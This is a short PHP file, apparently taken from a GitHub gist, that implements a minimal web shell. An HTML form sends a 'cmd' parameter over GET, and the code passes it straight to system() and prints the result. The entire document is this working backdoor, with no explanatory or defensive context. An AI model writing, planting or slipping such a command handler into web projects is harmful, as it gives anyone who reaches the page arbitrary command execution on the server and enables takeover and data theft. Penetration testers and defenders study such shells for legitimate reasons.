// https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?></pre></body></html>
